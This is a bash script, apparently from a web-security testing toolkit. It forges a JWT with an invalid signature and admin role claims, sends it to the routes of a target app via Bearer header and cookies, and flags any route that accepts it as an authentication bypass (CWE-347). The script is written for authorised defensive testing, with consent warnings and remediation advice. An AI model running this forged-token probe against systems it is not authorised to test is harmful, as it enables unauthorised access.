#!/usr/bin/env bash
# ⚠ DEFENSIVE CHECK — run only against a system you own/operate, with consent. Not for production or third-party targets.
# forged-token — does this app actually VERIFY JWT signatures? Forge a token with a BOGUS
# signature + far-future exp and present it to each route that is GATED without auth. A route
# that returns 401/403 with NO token but REACHES THE HANDLER (200/400/404/422/…) WITH the
# forged token is trusting an UNVERIFIED token = authentication bypass (CWE-347 / OWASP API2).
# This is the dynamic VERDICT on a `decodeJwtPayloadUnsafe` / `jwt.decode(verify=False)` finding:
# the recon says "an unverified decoder feeds an auth decision"; this proves which routes fall.
#
# Read-only by default (GET routes). Set PROBE_WRITES=1 to ALSO test write verbs (empty body —
# non-destructive) — LOCALHOST/TEST only. Reads this app's routes from ./probe-context.json
# (written by websec). Tries Authorization: Bearer, plus a cookie if you pass COOKIE_NAME.
# Usage:  TARGET=https://127.0.0.1:8443 [PROBE_WRITES=1] [COOKIE_NAME=session] bash forged-token.sh
set -uo pipefail
ctx="$(dirname "$0")/probe-context.json"
BASE="${TARGET:-$(python3 -c "import json;print(json.load(open('$ctx'))['target_base_url'])" 2>/dev/null)}"
if [ -z "${BASE:-}" ] || [ "${BASE#FILL}" != "$BASE" ]; then
  echo "Set TARGET=http://host:port (or fill target_base_url in probe-context.json)"; exit 2
fi
BASE="${BASE%/}"

# A structurally-valid JWT with a DELIBERATELY INVALID signature + far-future exp. A correct
# verifier rejects this outright; a decode-only auth path trusts its claims.
FORGED=$(python3 -c "
import base64, json
def b(o): return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
print(b({'alg':'RS256','typ':'JWT','kid':'forged'})+'.'+b({'sub':'websec-forged','email':'websec-forged@example.com','role':'admin','roles':['admin'],'exp':9999999999})+'.d2Vic2VjLWZvcmdlZC1zaWc')
")

# Auth cookie names the app reads (from recon → probe-context.json) + an optional COOKIE_NAME
# override. We forge into these too, not just Authorization: Bearer, so a cookie-ONLY app isn't
# a false negative. (portable; macOS bash 3.2 lacks `mapfile`.)
COOKIES=()
[ -n "${COOKIE_NAME:-}" ] && COOKIES+=("$COOKIE_NAME")
while IFS= read -r cn; do [ -n "$cn" ] && COOKIES+=("$cn"); done < <(python3 -c "
import json
for c in json.load(open('$ctx')).get('auth',{}).get('cookie_names',[]): print(c)
" 2>/dev/null)

# Routes to test: GET reads + GET idor/ssrf candidates (always); writes when PROBE_WRITES=1.
# Skip any path with an unfilled {param}. (portable; macOS bash 3.2 lacks `mapfile`.)
ROUTES=()
while IFS= read -r line; do [ -n "$line" ] && ROUTES+=("$line"); done < <(PROBE_WRITES="${PROBE_WRITES:-0}" python3 -c "
import json, os
c = json.load(open('$ctx')); eps = c['endpoints']
rows = list(eps.get('reads', []))
rows += [r.split('  ')[0] for r in eps.get('ssrf_candidates', [])]          # 'GET /x  (param: y)' -> 'GET /x'
rows += [r for r in eps.get('idor_candidates', []) if r.split(' ',1)[0] == 'GET']
if os.environ.get('PROBE_WRITES') == '1': rows += eps.get('writes', [])
seen=set(); out=[]
for r in rows:
    m = r.strip().split(' ', 1)
    if len(m) != 2: continue
    meth, path = m[0], m[1].split('  ')[0].strip()
    if '{' in path or (meth, path) in seen: continue
    seen.add((meth, path)); out.append(meth + ' ' + path)
print('\n'.join(out[:80]))
" 2>/dev/null)
if [ "${#ROUTES[@]}" -eq 0 ]; then
  echo "No concrete (no-{param}) routes in probe-context.json to test."; exit 2
fi

# Codes that mean the request REACHED THE HANDLER (auth passed). Excludes 401/403 (blocked),
# 429 (rate-limited), 5xx/000 (ambiguous) so an aggressive limiter can't manufacture a bypass.
reached() { case "$1" in 200|201|202|203|204|206|400|404|405|409|413|415|422) return 0;; *) return 1;; esac; }

echo "forged-token vs $BASE  ·  unsigned/bogus-sig JWT, far-future exp"
echo "  (a gated route that REACHES its handler with this token is NOT verifying the signature)"
echo "----------------------------------------------------------------------------------------------------"
bypass=0; ok=0; skip=0
for ep in "${ROUTES[@]}"; do
  method="${ep%% *}"; path="${ep#* }"
  data=(); { [ "$method" != "GET" ] && [ "$method" != "HEAD" ]; } && data=(-H 'content-type: application/json' --data '{}')
  na=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" "$BASE$path" ${data[@]+"${data[@]}"} --max-time 15)
  if [ "$na" != "401" ] && [ "$na" != "403" ]; then skip=$((skip+1)); continue; fi   # not gated unauthenticated → N/A here
  fg=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" "$BASE$path" -H "Authorization: Bearer $FORGED" ${data[@]+"${data[@]}"} --max-time 15)
  via="Bearer"
  if ! reached "$fg"; then   # Bearer didn't reach the handler → try forging into each known auth cookie
    for cn in ${COOKIES[@]+"${COOKIES[@]}"}; do
      cfg=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" "$BASE$path" -H "Cookie: $cn=$FORGED" ${data[@]+"${data[@]}"} --max-time 15)
      if reached "$cfg"; then fg="$cfg"; via="cookie:$cn"; break; fi
    done
  fi
  if reached "$fg"; then
    printf '  BYPASS  %s→%s  %s %s   (forged token accepted via %s)\n' "$na" "$fg" "$method" "$path" "$via"; bypass=$((bypass+1))
  else
    printf '  ok      %s→%s  %s %s\n' "$na" "$fg" "$method" "$path"; ok=$((ok+1))
  fi
done
echo "----------------------------------------------------------------------------------------------------"
echo "summary: $bypass forged-token BYPASS · $ok rejected · $skip not-gated (skipped)"
if [ "$bypass" -gt 0 ]; then
  echo "⚠ A token with NO valid signature reached the handler on $bypass route(s) — CWE-347 broken auth."
  echo "  Route the guard through a VERIFYING decode (jwt.verify with the key / a checked server session),"
  echo "  the same path your properly-protected routes use. Never trust a decode-only (\"Unsafe\") result."
fi
exit "$bypass"
